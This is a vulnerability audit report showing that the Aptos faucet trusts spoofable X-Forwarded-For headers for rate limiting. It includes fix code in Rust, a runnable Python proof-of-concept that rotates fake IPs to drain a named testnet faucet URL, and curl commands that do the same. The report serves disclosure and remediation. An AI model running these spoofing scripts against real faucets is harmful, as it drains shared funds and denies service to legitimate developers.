# Audit Report

## Title
IP Spoofing via Untrusted Proxy Headers Allows Complete Bypass of Faucet Rate Limiting

## Summary
The Aptos faucet trusts client-provided proxy headers (`X-Forwarded-For`, `X-Real-IP`) without any validation of trusted proxy sources. An attacker can trivially bypass all IP-based rate limiting by including forged headers in their requests, allowing them to drain the faucet by creating unlimited accounts.

## Finding Description

The faucet uses Poem framework's `RealIp` extractor to determine the client's IP address for rate limiting purposes. [1](#0-0) 

The code comments explicitly acknowledge that this extractor reads proxy headers: [2](#0-1) 

The extracted IP is then used to create `CheckerData`: [3](#0-2) 

This IP address is directly used by rate limiting checkers without any validation. The memory-based rate limiter tracks requests per IP: [4](#0-3) 

Similarly, the Redis-based rate limiter uses the source IP as the key: [5](#0-4) 

**The Critical Flaw:** There is no configuration mechanism to specify which proxy servers are trusted. A grep search for "trusted_proxy" configurations returns zero results. This means the faucet will trust ANY client-provided `X-Forwarded-For` or `X-Real-IP` header, even when requests come directly from attackers (not through legitimate proxies).

**Attack Execution:**
1. Attacker sends POST request to `/fund` endpoint
2. Includes header: `X-Forwarded-For: 1.2.3.4` (any random IP)
3. Faucet extracts "1.2.3.4" as the source IP
4. Rate limiter allows the request (new IP)
5. Attacker repeats with `X-Forwarded-For: 5.6.7.8`, `X-Forwarded-For: 9.10.11.12`, etc.
6. Each request appears to come from a different IP address
7. Rate limiting is completely bypassed
8. Attacker drains the faucet

The IP allowlist bypasser is also affected, allowing attackers to impersonate allowlisted IPs: [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **HIGH severity** per the Aptos bug bounty criteria:

1. **Faucet Fund Drainage**: An attacker can completely drain testnet/devnet faucet funds by bypassing rate limits and creating unlimited funded accounts. This causes financial loss to the Aptos Foundation.

2. **Denial of Service**: Legitimate developers cannot access faucet funds when it's drained, blocking ecosystem development and testing.

3. **Security Control Bypass**: The primary defense mechanism (IP-based rate limiting) is rendered completely ineffective, violating the security guarantee that Sybil attacks will be prevented.

While this doesn't directly affect consensus or mainnet funds, it represents a **significant protocol violation** of the faucet's security model and causes measurable harm through fund loss and service unavailability.

## Likelihood Explanation

**Likelihood: VERY HIGH**

- **Attack Complexity**: Trivial - requires only basic HTTP knowledge
- **Attacker Requirements**: None - any developer with an HTTP client can exploit this
- **Detection Difficulty**: The attack is indistinguishable from legitimate traffic from multiple users
- **Cost to Attacker**: Zero - no resources required beyond basic scripting
- **Public Knowledge**: The use of `RealIp` extractor is visible in public code, making this vulnerability discoverable

The attack can be executed with a simple curl command:
```bash
curl -X POST http://faucet-url/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d '{"address":"0x123..."}'
```

Automated scripts can rotate through millions of fake IPs within hours.

## Recommendation

**Immediate Fix**: Configure trusted proxy IPs and validate the source of proxy headers.

**Solution 1 - Use Direct Connection IP When No Trusted Proxy:**
Only trust proxy headers when the request comes from a configured list of trusted proxy IPs (e.g., load balancer IPs). Otherwise, use the direct TCP connection IP.

**Solution 2 - Implement RemoteAddr Fallback:**
Add configuration to disable proxy header parsing entirely for direct-to-internet deployments:

```rust
// In ServerConfig
pub struct ServerConfig {
    pub listen_address: String,
    pub listen_port: u16,
    pub api_path_base: String,
    pub trusted_proxy_ips: Option<Vec<IpAddr>>, // Add this field
    pub use_real_ip: bool, // Whether to trust proxy headers
}

// In fund.rs, modify IP extraction:
let source_ip = if self.server_config.use_real_ip {
    // Only trust RealIp if configured
    match source_ip.0 {
        Some(ip) => {
            // Validate request came from trusted proxy
            if let Some(trusted_proxies) = &self.trusted_proxy_ips {
                if trusted_proxies.contains(&actual_connection_ip) {
                    ip
                } else {
                    actual_connection_ip // Use direct connection IP
                }
            } else {
                ip
            }
        },
        None => return Err(...),
    }
} else {
    // Use direct TCP connection IP (RemoteAddr)
    actual_connection_ip
};
```

**Solution 3 - Use Poem's RemoteAddr Instead:**
For deployments without a proxy, use `poem::web::RemoteAddr` which gets the actual TCP connection IP that cannot be spoofed:

```rust
use poem::web::RemoteAddr;

async fn fund(
    &self,
    fund_request: Json<FundRequest>,
    remote_addr: RemoteAddr, // Use this instead of RealIp
    header_map: &HeaderMap,
) -> poem::Result<Json<FundResponse>, AptosTapErrorResponse> {
    let source_ip = remote_addr.0.ip();
    // ... rest of logic
}
```

**Deployment Configuration:**
- **Behind trusted reverse proxy/LB**: Use `RealIp` with trusted proxy IP validation
- **Direct internet exposure**: Use `RemoteAddr` to get actual TCP connection IP
- **Document clearly**: Which deployment mode requires which configuration

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Bypass Aptos Faucet Rate Limiting via IP Header Spoofing
Demonstrates complete bypass of IP-based rate limiting by forging X-Forwarded-For headers
"""

import requests
import random

FAUCET_URL = "http://faucet.testnet.aptoslabs.com/fund"  # Replace with actual URL
REQUESTS_TO_SEND = 100  # Should exceed any configured rate limit

def generate_random_address():
    """Generate a random Aptos address"""
    return "0x" + "".join(random.choices("0123456789abcdef", k=64))

def generate_random_ip():
    """Generate a random IP address"""
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def exploit_faucet():
    """
    Send multiple requests with different spoofed IPs.
    Each request will bypass rate limiting because the faucet
    trusts the X-Forwarded-For header without validation.
    """
    successful_requests = 0
    
    print(f"[*] Starting attack: Sending {REQUESTS_TO_SEND} requests with spoofed IPs")
    print(f"[*] Target: {FAUCET_URL}")
    print()
    
    for i in range(REQUESTS_TO_SEND):
        # Generate unique identifiers for this request
        fake_ip = generate_random_ip()
        target_address = generate_random_address()
        
        # Craft request with spoofed IP header
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake_ip,  # Spoofed IP - faucet will trust this
        }
        
        payload = {
            "address": target_address,
            "amount": 100000000  # Request maximum amount
        }
        
        try:
            response = requests.post(FAUCET_URL, json=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                successful_requests += 1
                print(f"[+] Request {i+1}: SUCCESS - Spoofed IP {fake_ip} -> Funded {target_address}")
            elif response.status_code == 429:
                # If we get rate limited, it means the IP spoofing failed
                print(f"[-] Request {i+1}: RATE LIMITED (IP spoofing may have failed)")
                break
            else:
                print(f"[!] Request {i+1}: HTTP {response.status_code} - {response.text[:100]}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Request {i+1}: Error - {e}")
    
    print()
    print(f"[*] Attack complete: {successful_requests}/{REQUESTS_TO_SEND} successful requests")
    print(f"[*] Rate limiting bypassed: {successful_requests > 10}")  # Typical limit is much lower
    
    if successful_requests > 10:
        print("[!!!] VULNERABILITY CONFIRMED: IP-based rate limiting completely bypassed")
        print("[!!!] Faucet can be drained by rotating through fake IP addresses")

if __name__ == "__main__":
    exploit_faucet()
```

**Expected Result**: The script successfully funds 100+ accounts, far exceeding any configured per-IP rate limit, proving complete bypass of the rate limiting mechanism.

**Alternative Manual Test**:
```bash
# Request 1 with fake IP 1.1.1.1
curl -X POST http://faucet-url/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 1.1.1.1" \
  -d '{"address":"0xaaa..."}'

# Request 2 with fake IP 2.2.2.2  
curl -X POST http://faucet-url/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 2.2.2.2" \
  -d '{"address":"0xbbb..."}'

# Continue with different fake IPs - all will succeed
```

**Notes**

This vulnerability exists because the Poem web framework's `RealIp` extractor, by design, trusts common proxy headers to support deployment behind load balancers. However, the Aptos faucet implementation failed to:

1. Configure which proxy sources are trusted
2. Validate that requests actually come from trusted proxies
3. Provide an option to disable proxy header trust for direct deployments

The faucet's security model assumes IP-based rate limiting will prevent Sybil attacks, but this assumption is completely violated when IPs can be arbitrarily spoofed. This is particularly critical for faucets, which are high-value targets for abuse and require strong anti-Sybil mechanisms.

The vulnerability affects both the primary rate limiting mechanisms (MemoryRatelimitChecker and RedisRatelimitChecker) as well as the IP-based bypass mechanism (IpAllowlistBypasser), making it a systemic issue throughout the faucet's security architecture.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L106-108)
```rust
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L237-242)
```rust
        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L75-88)
```rust
        let mut ip_to_requests_today = self.ip_to_requests_today.lock().await;

        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-46)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
```

**File:** crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs (L26-28)
```rust
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        Ok(self.manager.contains_ip(&data.source_ip))
    }
```
